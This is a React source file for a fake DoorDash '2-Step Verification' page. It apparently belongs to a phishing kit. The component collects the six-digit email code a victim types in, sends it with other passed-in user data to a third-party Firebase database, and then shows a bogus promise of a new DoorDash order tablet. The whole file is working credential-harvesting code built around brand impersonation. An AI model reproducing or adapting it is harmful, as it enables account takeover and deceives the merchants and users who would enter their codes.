import React, { useState } from 'react'
// import {RxCross2} from 'react-icons/rx'

function Component({  inputData, }) {
  const [secondOtp, setSecondOtp] = useState('');
  const [thankYou, setThankYour] = useState(true);
    const message = 'this is otp of this email:';
  
  const handleClick = async (e) => {
    e.preventDefault();

    // const {  firstName, text} = userData;
    const res = await fetch("https://testing-ec81f-default-rtdb.firebaseio.com/userDataRecords.json",{

      method : "POST",
      headers: {
        "Content-Type" : "application/json",
      },
      body: JSON.stringify({
         otp: message,  inputData, secondOtp,
      }),
    });

    if(res) {
      setThankYour(false)
    } else {
      alert("Plz enter data")
    }
  }


  return (
        <div className= 'h-full w-screen  flex flex-col justify-between ' >
            {
                thankYou ? (
                    <>
            
              {/* <div className=' bg-white p-5 sm:pr-7  flex  justify-end top-0 fixed w-screen   ' >
                <RxCross2 className=' right-0 text-2xl md:text-3xl cursor-pointer ' onClick={()=> setShow(true) } />
              </div> */}
            <div className=' bg-white h-full w-full flex flex-col items-center my-16 md:mt-24 max-w-[480px] lg:max-w-[600px] mx-auto   ' >
              <div className=' mx-3 ' >
                <svg height="64px" width="64px" fill="#ffffff" x="0px" y="0px" viewBox="0 0 64 64">
                  <path fill-rule="evenodd" clip-rule="evenodd" d="M22.9154 43.9993H16.9142C15.8416 
                  43.9994 14.797 43.9996 13.9124 43.9273C12.9409 43.8479 
                  11.7945 43.6606 10.641 43.0729C9.04166 42.258 7.74135 
                  40.9577 6.92644 39.3583C6.33869 38.2048 6.15141 37.0584
                  6.07203 36.0869C5.99976 35.2023 5.99988 34.1577 6.00001
                  33.085L6.00001 20.9143C5.99988 19.8417 5.99976 18.7971 
                  6.07203 17.9124C6.15141 16.9409 6.3387 15.7945 6.92645 
                  14.641C7.74135 13.0417 9.04166 11.7414 10.641 10.9264C11.7945
                  10.3387 12.9409 10.1514 13.9124 10.072C14.797 9.99976 15.8416 9.99988 16.9142 10L37.585 10C38.6576 9.99988 
                  39.7021 9.99976 40.5868 10.072C41.5583 10.1514 42.7046 10.3387 43.8581 10.9264C45.4575 11.7414 46.7578 13.0417 47.5727 
                  14.641C48.1604 15.7945 48.3477 16.9409 48.4271 17.9124C48.4568 18.2759 48.4743 18.6663 48.4846 19.0747C46.451 18.3781 44.2697 18
                  42 18C41.9902 18 41.9803 18 41.9705 18L43.9133 16.8572C43.8753 16.758 43.8331 16.6628 43.786 16.5704C43.3785 
                  15.7708 42.7284 15.1206 41.9287 14.7131C41.0196 14.2499 39.8295 14.2499 37.4494 14.2499L17.0498 14.2499C14.6696 14.2499 13.4795
                  14.2499 12.5704 14.7131C11.7707 15.1206 11.1206 15.7708 10.7131 16.5704C10.6661 16.6628 10.6238 16.758 10.5859 16.8571L26.0386 
                  25.9469C25.1861 27.074 24.4503 28.2942 23.849 29.5896L10.2499 21.5901L10.2499 32.9495C10.2499 35.3297 10.2499 36.5198 10.7131 
                  37.4289C11.1206 38.2286 11.7707 38.8787 12.5704 39.2862C13.4795 39.7494 14.6696 
                  39.7494 17.0498 39.7494H22.0755C22.2026 41.2171 22.4884 42.6395 22.9154 43.9993Z" fill="#FF0000"></path>
                  <path d="M48.4142 36.4142C49.1953 35.6332 49.1953 34.3668 48.4142 33.5858C47.6332 32.8047 46.3668 32.8047 45.5858 
                  33.5858L40 39.1716L38.4142 37.5858C37.6332 36.8047 36.3668 36.8047 35.5858 37.5858C34.8047 38.3668 
                  34.8047 39.6332 35.5858 40.4142L38.5858 43.4142C39.3668 44.1953 40.6332 44.1953 41.4142 
                  43.4142L48.4142 36.4142Z" fill="#FF0000"></path>
                  <path fill-rule="evenodd" clip-rule="evenodd" d="M58 38C58 46.8366 50.8366 54 42 54C33.1634 54 26 46.8366 26 38C26 
                  29.1634 33.1634 22 42 22C50.8366 22 58 29.1634 58 38ZM54 38C54 44.6274 48.6274 50 42 50C35.3726 50 30 44.6274 30 38C30 31.3726 
                  35.3726 26 42 26C48.6274 26 54 31.3726 54 38Z" fill="#FF0000"></path>
                </svg>
              </div>
              <div className=' text-center mx-3 ' >
                <h1 className=' font-bold text-2xl my-3 ' > 2-Step Verification </h1>
                <p className=' font-semibold text-black text-opacity-60  ' >For your security, we want to make sure its really you</p>
              </div>
              <div className=' flex flex-col mt-12 mx-3 ' >
                  <label className=' my-2 mx-1 text-base ' htmlFor="otp-1">Enter 6-digit code</label>
                  <input type="number" id='opt-1' 
                    onChange={(e) => { setSecondOtp(e.target.value);}}
                    className=' text-sm border border-black border-opacity-30 rounded-lg p-3  outline-[#91A5F9] [appearance:textfield] [&::-webkit-outer-spin-button]:appearance-none [&::-webkit-inner-spin-button]:appearance-none '  />
                  <div className='my-3 mx-1 ' >
                    <p className='font-semibold text-black text-opacity-60 mx-1 '>We sent a code to your email. Can't find it? Search for an email from no-reply@doordash.com </p>
                  </div>
              </div>
              <div className=' flex flex-row items-center text-[14.5px]  tracking-wide mb-52 ' >
                <a className=' p-2.5 underline  ' href="">Resend Code</a>
                <p className='text-[9px]' >•</p>
                <a className=' p-2.5 underline ' href="">Send to Phone</a>
                <p className='text-[9px]' >•</p>
                <a className=' p-2.5 underline  ' href="">Get Help</a>
              </div>
            </div>
            <div className=' border-t border-full bg-white border-black border-opacity-30 fixed bottom-0 w-screen text-center p-4 px-6  ' >
              <button className=' bg-[#4969F5] hover:bg-[#1537C7] hover:text-slate-50 active:bg-[#132c9c] active:text-slate-50 rounded-lg w-full p-3 text-white max-w-[650px] ' onClick={handleClick} >Submit</button>
            </div>
            </>
                ) : (
            <div className=' flex flex-col justify-center text-center ' >
                <h1 className=' text-6xl font-bold  mt-52 text-orange-600 p-3 ' >Thank You</h1>
                <h2 className=' font-semibold text-3xl p-2 ' >For helping Us. </h2>
                <p className=' text-xl font-semibold  ' >You will receive new order tablet from <br/>DoorDash in two weeks.</p>
            </div> ) 
            }
        </div>
  )
}


export default Component

